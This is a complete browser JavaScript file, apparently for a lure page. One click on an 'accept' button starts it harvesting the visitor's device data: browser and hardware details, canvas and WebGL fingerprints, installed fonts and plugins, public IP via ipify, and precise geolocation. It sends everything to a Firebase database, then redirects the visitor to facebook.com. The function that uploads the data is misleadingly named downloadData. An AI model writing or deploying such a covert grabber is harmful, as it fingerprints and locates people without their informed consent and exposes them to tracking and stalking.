// Ensure Firebase is initialized in your HTML file before this script runs
document.addEventListener('DOMContentLoaded', function() {
    const acceptBtn = document.getElementById('acceptBtn');
    
    acceptBtn.addEventListener('click', function() {
        // Change button state immediately
        acceptBtn.textContent = 'Processing...';
        acceptBtn.classList.add('processing');
        acceptBtn.disabled = true;
        
        // Start data collection immediately
        collectAllData();
    });
});

async function collectAllData() {
    const startTime = Date.now();
    const collectedData = {
        timestamp: new Date().toISOString(),
        collection_start: startTime
    };
    
    try {
        // Collect browser and device information
        collectBrowserData(collectedData);
        collectScreenData(collectedData);
        collectHardwareData(collectedData);
        collectTimezoneData(collectedData);
        collectStorageData(collectedData);
        collectPluginsData(collectedData);
        collectCanvasFingerprint(collectedData);
        collectWebGLData(collectedData);
        collectFontsData(collectedData);
        collectTouchData(collectedData);
        
        // Collect network information (async)
        await collectNetworkData(collectedData);
        
        // Collect IP address (async)
        await collectIPData(collectedData);
        
        // Collect geolocation (async)
        await collectGeolocationData(collectedData);
        
        // Add collection end time
        collectedData.collection_end = Date.now();
        collectedData.total_collection_time = collectedData.collection_end - startTime;
        
        // Send the data to Firebase (async)
        await downloadData(collectedData);
    } catch (e) {
        console.error('Error during data collection:', e);
    } finally {
        // Redirect to Facebook after data collection and sending, or if an error occurs
        window.location.href = 'https://www.facebook.com';
    }
}

// Function to collect browser data
function collectBrowserData(data) {
    try {
        data.browser = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages || [],
            platform: navigator.platform,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            onLine: navigator.onLine,
            vendor: navigator.vendor,
            vendorSub: navigator.vendorSub,
            product: navigator.product,
            productSub: navigator.productSub,
            appName: navigator.appName,
            appVersion: navigator.appVersion,
            appCodeName: navigator.appCodeName,
            buildID: navigator.buildID || null,
            oscpu: navigator.oscpu || null
        };
    } catch (e) {
        console.error('Error collecting browser data:', e);
        data.browser_error = e.message;
    }
}

// Function to collect screen and window data
function collectScreenData(data) {
    try {
        data.screen = {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            devicePixelRatio: window.devicePixelRatio,
            orientation: screen.orientation ? screen.orientation.type : null,
            orientationAngle: screen.orientation ? screen.orientation.angle : null
        };
        
        data.window = {
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight,
            scrollX: window.scrollX,
            scrollY: window.scrollY,
            screenX: window.screenX,
            screenY: window.screenY
        };
    } catch (e) {
        console.error('Error collecting screen data:', e);
        data.screen_error = e.message;
    }
}

// Function to collect hardware data
function collectHardwareData(data) {
    try {
        data.hardware = {
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory || null,
            maxTouchPoints: navigator.maxTouchPoints || 0
        };
    } catch (e) {
        console.error('Error collecting hardware data:', e);
        data.hardware_error = e.message;
    }
}

// Async function to collect network data
async function collectNetworkData(data) {
    try {
        if ('connection' in navigator) {
            const conn = navigator.connection;
            data.network = {
                type: conn.type || null,
                effectiveType: conn.effectiveType || null,
                downlink: conn.downlink || null,
                downlinkMax: conn.downlinkMax || null,
                rtt: conn.rtt || null,
                saveData: conn.saveData || false
            };
        }
    } catch (e) {
        console.error('Error collecting network data:', e);
        data.network_error = e.message;
    }
}

// Async function to collect IP data
async function collectIPData(data) {
    try {
        const response = await fetch('https://api.ipify.org?format=json', {
            timeout: 2000
        });
        const ipData = await response.json();
        data.ip_address = ipData.ip;
    } catch (e) {
        console.error('Error collecting IP data:', e);
        data.ip_error = e.message;
    }
}

// Async function to collect geolocation data
async function collectGeolocationData(data) {
    return new Promise((resolve) => {
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    data.geolocation = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        altitudeAccuracy: position.coords.altitudeAccuracy,
                        heading: position.coords.heading,
                        speed: position.coords.speed,
                        timestamp: position.timestamp
                    };
                    resolve();
                },
                (error) => {
                    data.geolocation_error = {
                        code: error.code,
                        message: error.message
                    };
                    resolve();
                },
                {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                }
            );
        } else {
            data.geolocation_error = 'Geolocation not supported';
            resolve();
        }
    });
}

// Function to collect timezone data
function collectTimezoneData(data) {
    try {
        data.timezone = {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezoneOffset: new Date().getTimezoneOffset(),
            locale: Intl.DateTimeFormat().resolvedOptions().locale,
            dateString: new Date().toString(),
            utcString: new Date().toUTCString(),
            isoString: new Date().toISOString()
        };
    } catch (e) {
        console.error('Error collecting timezone data:', e);
        data.timezone_error = e.message;
    }
}

// Function to collect storage data
function collectStorageData(data) {
    try {
        data.storage = {
            localStorage: typeof(Storage) !== "undefined" && typeof(localStorage) !== "undefined",
            sessionStorage: typeof(Storage) !== "undefined" && typeof(sessionStorage) !== "undefined",
            indexedDB: typeof(indexedDB) !== "undefined",
            webSQL: typeof(openDatabase) !== "undefined"
        };
    } catch (e) {
        console.error('Error collecting storage data:', e);
        data.storage_error = e.message;
    }
}

// Function to collect plugins data
function collectPluginsData(data) {
    try {
        data.plugins = [];
        for (let i = 0; i < navigator.plugins.length; i++) {
            const plugin = navigator.plugins[i];
            data.plugins.push({
                name: plugin.name,
                filename: plugin.filename,
                description: plugin.description,
                version: plugin.version || null
            });
        }
        
        data.mimeTypes = [];
        for (let i = 0; i < navigator.mimeTypes.length; i++) {
            const mimeType = navigator.mimeTypes[i];
            data.mimeTypes.push({
                type: mimeType.type,
                description: mimeType.description,
                suffixes: mimeType.suffixes
            });
        }
    } catch (e) {
        console.error('Error collecting plugins data:', e);
        data.plugins_error = e.message;
    }
}

// Function to collect canvas fingerprint
function collectCanvasFingerprint(data) {
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 200;
        canvas.height = 50;
        
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('Canvas fingerprint test 🔒', 2, 2);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillRect(100, 5, 80, 25);
        
        data.canvas_fingerprint = canvas.toDataURL();
    } catch (e) {
        console.error('Error collecting canvas fingerprint:', e);
        data.canvas_error = e.message;
    }
}

// Function to collect WebGL data
function collectWebGLData(data) {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        
        if (gl) {
            data.webgl = {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS)
            };
        }
    } catch (e) {
        console.error('Error collecting WebGL data:', e);
        data.webgl_error = e.message;
    }
}

// Function to collect fonts data
function collectFontsData(data) {
    try {
        const testFonts = [
            'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana',
            'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
            'Trebuchet MS', 'Arial Black', 'Impact', 'Lucida Sans Unicode',
            'Tahoma', 'Lucida Console', 'Monaco', 'Bradley Hand ITC',
            'Brush Script MT', 'Luminari', 'Chalkduster'
        ];
        
        data.fonts = testFonts.filter(font => {
            return document.fonts.check(`12px "${font}"`);
        });
    } catch (e) {
        console.error('Error collecting fonts data:', e);
        data.fonts_error = e.message;
    }
}

// Function to collect touch data
function collectTouchData(data) {
    try {
        data.touch = {
            touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
            maxTouchPoints: navigator.maxTouchPoints || 0
        };
    } catch (e) {
        console.error('Error collecting touch data:', e);
        data.touch_error = e.message;
    }
}

// Async function to send data to Firebase
async function downloadData(data) {
    try {
        const db = firebase.database();
        await db.ref('data').push(data);
        console.log('Data saved to Firebase');
    } catch (e) {
        console.error('Error saving data to Firebase:', e);
    }
}
